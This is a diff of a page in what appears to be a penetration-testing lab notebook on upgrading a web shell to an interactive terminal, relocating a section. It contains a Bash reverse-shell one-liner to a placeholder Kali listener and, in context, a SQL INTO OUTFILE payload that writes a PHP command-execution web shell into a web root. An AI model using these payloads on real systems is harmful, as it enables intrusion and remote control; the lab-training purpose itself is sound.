@@ -21,18 +21,6 @@ Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=web-shell-to-terminal) · [All tools](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-## Connect a Linux web execution context to a listener
-
-**Run in:** Linux web application's command-execution field. **Requires:** Confirmed OS-command execution, Bash support, correct request encoding and a reachable Kali listener on TCP 443; the web worker's identity remains the starting identity.
-
-```bash
-bash -c 'bash -i >& /dev/tcp/KALI_IP/443 0>&1'
-```
-
-**What the result establishes:** Prove command execution and network direction separately, then establish a usable shell and verify identity.
-
-**Next check:** Inspect callback reachability and server-side process limits; if a shell arrives, record id, pwd and network context before selecting a terminal-upgrade method.
-
 ## 1. Kali — listen
 
 **Kali**
@@ -96,6 +84,18 @@ stty rows ROWS columns COLUMNS
 
 Replace ROWS and COLUMNS with the numbers from Kali. If your local terminal is broken after disconnecting, run stty sane; reset on Kali.
 
+## Connect a Linux web execution context to a listener
+
+**Run in:** Linux web application's command-execution field. **Requires:** Confirmed OS-command execution, Bash support, correct request encoding and a reachable Kali listener on TCP 443; the web worker's identity remains the starting identity.
+
+```bash
+bash -c 'bash -i >& /dev/tcp/KALI_IP/443 0>&1'
+```
+
+**What the result establishes:** Prove command execution and network direction separately, then establish a usable shell and verify identity.
+
+**Next check:** Inspect callback reachability and server-side process limits; if a shell arrives, record id, pwd and network context before selecting a terminal-upgrade method.
+
 ## If it fails
 
 | Symptom | Check |
@@ -148,6 +148,8 @@ SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
 - [Official documentation 1](https://www.gnu.org/software/bash/manual/html_node/Redirections.html)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
